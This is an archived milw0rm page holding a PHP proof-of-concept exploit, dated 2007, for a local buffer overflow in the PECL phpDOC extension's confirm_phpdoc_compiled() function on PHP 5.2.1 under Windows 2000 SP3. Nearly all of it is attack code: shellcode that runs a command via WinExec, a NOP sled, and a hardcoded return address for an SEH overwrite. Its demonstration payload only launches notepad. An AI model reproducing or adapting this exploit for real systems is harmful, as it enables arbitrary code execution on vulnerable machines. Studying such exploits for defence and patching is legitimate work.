<html><head><title>PHP 5.2.1 with PECL phpDOC Local Buffer Overflow Exploit</title></head><pre>&lt;?php
//PHP 5.2.1 with PECL phpDOC confirm_phpdoc_compiled() local buffer overflow poc exploit
//WIN 2K SP3 version / seh overwrite method
//to be launched from the cli

// by rgod
// site: http://retrogod.altervista.org

if (!extension_loaded(&quot;phpDOC&quot;)){
die(&quot;you need the phpDOC extension loaded.&quot;);
}


$____scode=
&quot;\xeb\x1b&quot;.
&quot;\x5b&quot;.
&quot;\x31\xc0&quot;.
&quot;\x50&quot;.
&quot;\x31\xc0&quot;.
&quot;\x88\x43\x59&quot;.
&quot;\x53&quot;.
&quot;\xbb\xca\x73\xe9\x77&quot;. //WinExec
&quot;\xff\xd3&quot;.
&quot;\x31\xc0&quot;.
&quot;\x50&quot;.
&quot;\xbb\x5c\xcf\xe9\x77&quot;. //ExitProcess
&quot;\xff\xd3&quot;.
&quot;\xe8\xe0\xff\xff\xff&quot;.
&quot;\x63\x6d\x64&quot;.
&quot;\x2e&quot;.
&quot;\x65&quot;.
&quot;\x78\x65&quot;.
&quot;\x20\x2f&quot;.
&quot;\x63\x20&quot;.
&quot;start notepad &amp; &quot;;

//eip &amp; ecx set to the same value ...
$eip=&quot;\x47\x30\xE9\x77&quot;;//0x77E93047      pop ECX - pop - retbis kernel32.dll
//and further (junk...) inc edi, xor cl ch, *ja short* 
//should work on sp4 if you find an usable address
$____suntzu=str_repeat(&quot;\x90&quot;,1393 - strlen($____scode)).$____scode.str_repeat(&quot;\x90&quot;,30).$eip.str_repeat(&quot;\x90&quot;,12);
confirm_phpdoc_compiled($____suntzu);

?&gt;

# milw0rm.com [2007-03-25]</pre></html>